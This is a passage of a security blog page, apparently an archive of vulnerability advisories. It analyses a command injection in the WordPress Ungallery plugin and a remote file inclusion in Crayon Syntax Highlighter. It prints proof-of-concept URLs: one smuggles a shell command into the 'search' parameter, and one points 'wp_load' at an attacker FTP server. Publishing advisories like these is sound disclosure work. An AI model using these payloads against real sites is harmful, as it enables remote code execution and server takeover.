						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987796e18a575572752-18"><span class="crayon-sy">$</span><span class="crayon-v">gallerylink</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'gallerylink'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e18a575572752-19"><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'search'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796e18a575572752-20"><span class="crayon-sy">$</span><span class="crayon-v">dir</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pic_root</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">gallerylink</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e18a575572752-21">&nbsp;</div><div class="crayon-line" id="crayon-53c987796e18a575572752-22"><span class="crayon-c">//&nbsp;&nbsp;&nbsp;&nbsp;Find galleries</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e18a575572752-23"><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"Searching in &lt;i&gt;$dir.&lt;/i&gt;</span></div><div class="crayon-line" id="crayon-53c987796e18a575572752-24"><span class="crayon-s">&lt;br /&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e18a575572752-25"><span class="crayon-s">&lt;br /&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796e18a575572752-26">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e18a575572752-27"><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"These galleries matched &lt;i&gt;$search:&lt;/i&gt;&lt;br /&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796e18a575572752-28"><span class="crayon-sy">$</span><span class="crayon-v">galleries</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">`</span><span class="crayon-i">find</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">dir</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">iname</span><span class="crayon-h"> </span><span class="crayon-sy">\</span><span class="crayon-o">*</span><span class="crayon-sy">$</span><span class="crayon-i">search</span><span class="crayon-sy">\</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">type</span><span class="crayon-h"> </span><span class="crayon-i">d</span><span class="crayon-sy">`</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e18a575572752-29">&nbsp;</div><div class="crayon-line" id="crayon-53c987796e18a575572752-30"><span class="crayon-sy">$</span><span class="crayon-v">galleries</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">"\n"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">galleries</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0032 seconds] -->
<p>Note that the <a href="http://php.net/manual/en/language.operators.execution.php">backtick character</a> in PHP has a special meaning, as opposed to the &#8221; and &#8216;. When you wrap something in 2 <a href="http://php.net/manual/en/language.operators.execution.php">backtick characters</a>, it will act as if the contents between them is passed to shell_exec. Note however that the $search variable, which is extracted from the search GET variable, is never sanitized before passed into the exec on line 28. This means that we can pull off a remote command injection with a simple request like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987796e199842918954" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/?x=x&amp;search=x | dir</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987796e199842918954-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987796e199842918954-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?x=x&amp;search=x | dir</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/command-injection/" rel="tag">Command Injection</a>, <a href="http://ceriksen.com/tag/ungallery/" rel="tag">Ungallery</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/10/23/wordpress-ungallery-remote-command-injection-vulnerability/#respond" title="Comment on WordPress Ungallery remote command injection vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-176 -->

				
					
<article id="post-139" class="post-139 post type-post status-publish format-standard hentry category-advisories tag-crayon-syntax-highlighter tag-rfi tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/10/15/wordpress-crayon-syntax-highlighter-remote-file-inclusion-vulnerability/" title="1:14 pm" rel="bookmark" class="entry-date"><time datetime="2012-10-15T13:14:46+00:00" pubdate>October 15, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/10/15/wordpress-crayon-syntax-highlighter-remote-file-inclusion-vulnerability/" title="Permalink to WordPress Crayon Syntax Highlighter remote file inclusion vulnerability" rel="bookmark">WordPress Crayon Syntax Highlighter remote file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href=" http://secunia.com/advisories/50804">Secunia advisory SA 50804</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The Crayon Syntax highlighter implements a vulnerable RPC-like system for AJAX in <a href="http://plugins.svn.wordpress.org/crayon-syntax-highlighter/trunk/util/ajax.php">/util/ajax.php</a> and <a href="http://plugins.svn.wordpress.org/crayon-syntax-highlighter/trunk/util/preview.php">/util/preview.php</a>. Both files share these 3 lines of code as being the first ones in both:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987796e6f5742889380" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require_once('../crayon_wp.class.php');
crayon_die_if_not_php($_GET['wp_load'], 'wp-load');
require_once($_GET['wp_load']);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987796e6f5742889380-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e6f5742889380-2">2</div><div class="crayon-num" data-line="crayon-53c987796e6f5742889380-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987796e6f5742889380-1"><span class="crayon-k ">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../crayon_wp.class.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e6f5742889380-2"><span class="crayon-e">crayon_die_if_not_php</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'wp_load'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'wp-load'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796e6f5742889380-3"><span class="crayon-k ">require_once</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'wp_load'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->
<p>So it apperas that at least it attempts to do some validation. Let us see how that is implemented in global.php(Included by crayon_wp.class.php):</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987796e704834337957" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Checks if the input is a valid PHP file and matches the $valid filename
function crayon_is_php_file($filepath, $valid) {
	$path_wp_load = pathinfo($filepath);
	return is_file($filepath) &amp;&amp; $path_wp_load['extension'] === 'php' &amp;&amp; $path_wp_load['filename'] === $valid;
}

// Stops the script if crayon_is_php_file() returns false
function crayon_die_if_not_php($filepath, $valid) {
	if (!crayon_is_php_file($filepath, $valid)) {
		die("Incorrect arguments for '$valid'");
	}
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987796e704834337957-187">187</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e704834337957-188">188</div><div class="crayon-num" data-line="crayon-53c987796e704834337957-189">189</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e704834337957-190">190</div><div class="crayon-num" data-line="crayon-53c987796e704834337957-191">191</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e704834337957-192">192</div><div class="crayon-num" data-line="crayon-53c987796e704834337957-193">193</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e704834337957-194">194</div><div class="crayon-num" data-line="crayon-53c987796e704834337957-195">195</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e704834337957-196">196</div><div class="crayon-num" data-line="crayon-53c987796e704834337957-197">197</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e704834337957-198">198</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987796e704834337957-187"><span class="crayon-c">// Checks if the input is a valid PHP file and matches the $valid filename</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e704834337957-188"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">crayon_is_php_file</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987796e704834337957-189"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$path_wp_load</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">pathinfo</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e704834337957-190"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-e">is_file</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">$path_wp_load</span><span class="crayon-sy">[</span><span class="crayon-s">'extension'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">===</span><span class="crayon-h"> </span><span class="crayon-s">'php'</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">$path_wp_load</span><span class="crayon-sy">[</span><span class="crayon-s">'filename'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">===</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796e704834337957-191"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e704834337957-192">&nbsp;</div><div class="crayon-line" id="crayon-53c987796e704834337957-193"><span class="crayon-c">// Stops the script if crayon_is_php_file() returns false</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e704834337957-194"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">crayon_die_if_not_php</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987796e704834337957-195"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">crayon_is_php_file</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e704834337957-196"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">die</span><span class="crayon-sy">(</span><span class="crayon-s">"Incorrect arguments for '$valid'"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796e704834337957-197"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796e704834337957-198"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0040 seconds] -->
<p>So it calls crayon_is_php_file which checks if the provided path is a file, the extension is &#8220;php&#8221; and the filename is what is expected, which in this case is wp-load.php. In theory, this should be safe if we assume that is_file only returns true for local file. However due to is_file also supporting FTP, we can get it to return true for a remote file on a FTP server! This means that if the server allows url includes, we can do a remote file include from a malicious FTP server hosting a wp-load.php file through an URL like this, either through ajax.php or preview.php:</p>
<p>http://192.168.80.130/wordpress/wp-content/plugins/crayon-syntax-highlighter/util/ajax.php?wp_load=ftp://192.168.80.201/wp-load.php</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/crayon-syntax-highlighter/" rel="tag">Crayon Syntax Highlighter</a>, <a href="http://ceriksen.com/tag/rfi/" rel="tag">RFI</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/10/15/wordpress-crayon-syntax-highlighter-remote-file-inclusion-vulnerability/#comments" title="Comment on WordPress Crayon Syntax Highlighter remote file inclusion vulnerability">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-139 -->

				
					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

	
	</nav><!-- #nav-below -->
	
			
			</div><!-- #content -->
		</section><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3"><a href="http://ceriksen.com/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
</li>
	<li class="cat-item cat-item-12"><a href="http://ceriksen.com/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="http://ceriksen.com/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->


</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 20:45:45 by W3 Total Cache -->